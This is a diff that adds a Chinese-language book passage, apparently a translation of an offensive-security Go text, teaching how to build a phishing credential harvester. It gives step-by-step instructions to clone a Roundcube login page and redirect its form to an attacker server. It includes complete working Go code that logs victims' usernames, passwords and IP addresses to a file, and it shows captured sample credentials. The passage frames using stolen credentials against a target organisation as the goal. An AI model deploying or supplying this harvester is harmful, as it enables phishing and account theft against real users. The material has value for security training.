@@ -410,4 +410,116 @@ $ go build -o template_example $ ./template_example
 
 如何摆脱创建服务器和处理请求的基础知识，而是专注于更邪恶的事情。让我们来创建一个凭据收割机吧！
 
+## 凭据收割机
+
+社会工程的主要内容之一是`credential-harvesting attack`。这种类型的攻击通过钓鱼的方式收集用户在某个网站的登录信息。这种攻击对于网上使用单个身份验证接口的组织非常有用。一旦获取到用户的凭证，就能登录到原网站访问其账户。这通常会导致该组织的外围网络遭到初步破坏。
+
+对于这种类型的攻击，Go是非常棒的平台，因为能快速创建服务，因为非常容易地配置路由来解析用户的输入。可以向凭证收集服务添加更多的定制功能。但是本例，我们仍然学习基础。
+
+首先，需要克隆具有登录表单的站点。这有很多的方法。实际上，更望克隆正在使用的站点。不过，本例克隆Roundcube站点。`Roundcube`是个开源的web邮件客户端，不像商业软件那样常用，例如Microsoft Exchange，但是幸好也能让我们阐明这些概念。使用Docker 来运行 Roundcube，因为会更简单些。
+
+执行下面的命令就能启动自己的Roundcube服务。如果不想运行Roundcube服务也不要担心，实战源代码也有一个站点的克隆。不过，为了完整起见，我们还是加上了这个:
+```shell script
+$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube
+```
+该命令启动了一个Roundcube的Docker实例。如果浏览http://127.0.0.1:80的话，会看到一个登录表单。通常情况下，用`wget`克隆一个站点和所有该站点所需要的文件，但是Roundcube使用的是JavaScript，可以防止这种情况发生。但是，可以使用Google Chrome来保存。在实战目录下，会看到一个文件夹的结构如代码4-7所示：
+```shell script
+$ tree
+.
++-- main.go
++-- public
+    +-- index.html
+    +-- index_files
+        +-- app.js
+        +-- common.js
+        +-- jquery-ui-1.10.4.custom.css
+        +-- jquery-ui-1.10.4.custom.min.js
+        +-- jquery.min.js
+        +-- jstz.min.js
+        +-- roundcube_logo.png
+        +-- styles.css
+        +-- ui.js
+    index.html
+```
+代码 4-7: https://github.com/blackhat-go/bhg/ch-4/credential_harvester/ 文件夹结构
+
+`public`目录中的文件表示未更改的克隆登录站点。需要修改原始的登录表单来重定向输入的凭证，将它们发送给自己的服务而不是之前那个合法的服务。开始，打开`public/index.html`并找到使用POST发送登录请求的表单元素。应该看起来像下面这样：
+```html
+<form name="form" method="post" action="http://127.0.0.1/?_task=login">
+```
+需要将标签为`action`的属性更改为自己的服务地址。将`action`改为`/login`并保存。现在该行看起来像下面这样：
+```html
+<form name="form" method="post" action="/login">
+```
+
+首先需要提供`public`目录中的文件，才能正确的渲染登录表单和捕获username和password。然后需要为`/login`写个`HandleFunc`来捕获username和password。还希望将捕获的凭证存储在文件中，并进行详细的日志记录。
+
+只需几十行代码就可以处理所有的这些问题。代码4-8是该程序的完整代码。
+```go
+package main
+
+import (
+	"net/http"
+	"os"
+	"time"
+
+	log "github.com/Sirupsen/logrus"
+	"github.com/gorilla/mux"
+)
+
+func login(w http.ResponseWriter, r *http.Request) {
+	log.WithFields(log.Fields{
+		"time":       time.Now().String(),
+		"username":   r.FormValue("_user"),
+		"password":   r.FormValue("_pass"),
+		"user-agent": r.UserAgent(),
+		"ip_address": r.RemoteAddr,
+	}).Info("login attempt")
+	http.Redirect(w, r, "/", 302)
+}
+
+func main() {
+	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
+	if err != nil {
+		panic(err)
+	}
+	defer fh.Close()
+	log.SetOutput(fh)
+	r := mux.NewRouter()
+	r.HandleFunc("/login", login).Methods("POST")
+	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))
+	log.Fatal(http.ListenAndServe(":8080", r))
+}
+```
+代码 4-8: Credential-harvesting 服务 (https://github.com/blackhat-go/bhg/ch-4/credential_harvester/ main.go/)
+
+值得注意的第一件事是导入`github.com/Sirupsen/logrus`包。这是一个日志包，用来代替Go的`log`包。该包支持更多的日志配置选型来更好地处理错误。使用该包前需要先运行`go get`获取。
+
+下一步，定义`login()`处理函数。希望这是个熟悉的模式。在该函数里，使用` log.WithFields() `记录捕获的数据。显示当前时间，请求者的用户带来，IP地址。也调用`FormValue(string)`捕获提交的`username (_user)`和`password (_pass)`的值。从`index.html `中获取这些值，并且通过定位表单的输入元素来查找`username`和`password`。服务需要明确地与存在于登录表单中的字段名称保持一致。
+
+下面的片段是从`index.html`中提取的，显示相关的输入项，为了清晰起见元素名称加粗:
+ ```html
+<td class="input"><input name="_user" id="rcmloginuser" required="required" size="40" autocapitalize="off" autocomplete="off" type="text"></td>
+<td class="input"><input name="_pass" id="rcmloginpwd" required="required" size="40" autocapitalize="off" autocomplete="off" type="password"></td>
+ ```
+
+ 在`main()`函数中，先打开文件用来保存捕获的数据，然后使用`log.SetOutput(io.Writer)`，传入刚创建的文件柄来配置日志，以便将数据写到文件中。接下来创建新路由，并加上处理函数`login()`。
+
+ 启动服务之前，还要做一件看起来陌生的事情：告诉路由支持文件夹里的静态文件。这样Go服务就好明确地知道静态文件（图像， JavaScript，HTML）的位置。Go简化了这一过程，并提供了针对遍历目录攻击的保护。由里而外，使用`http.Dir(string)`定义希望提供文件的目录。然后将其传入到`http.FileServer(FileSystem)`，这样就为该目录创建了一个`http.Handler`。使用`PathPrefix(string)`将其加到路由上。使用`/`作为路径前缀来匹配任何尚未找到匹配的请求。注意，默认情况下从`FileServer`返回的处理器支持目录索引。这可能会泄露某些信息。当然也可以将其禁用，但是这里先不涉及了。
+
+ 最后，像之前那样启动服务。构建并执行代码4-8中的代码之后，打开浏览器并浏览`http://localhost:8080`。尝试在表单中提交`username 和 password`。然后回到终端退出程序，查看`credentials.txt`显示如下：
+ ```shell script
+$ go build -o credential_harvester
+$ ./credential_harvester
+^C
+$ cat credentials.txt
+INFO[0038] login attempt
+ip_address="127.0.0.1:34040" password="p@ssw0rd1!" time="2020-02-13 21:29:37.048572849 -0800 PST" user-agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0" username=bob
+ ```
+
+ 看看这些日志！可以看到用户名为bob，密码为p@ssw0rd1!。恶意的服务成功地处理了POST表单，捕获到输入的凭证，并保存到能离线查看的文件中。作为攻击者，您可以尝试针对目标组织使用这些凭证，并继续进行进一步的攻击。
+
+ 在下一节中，将学习这种凭证收集技术的变体。不是等待表单提交，而是创建键盘记录器来实时捕获按键。
+
+ 
 
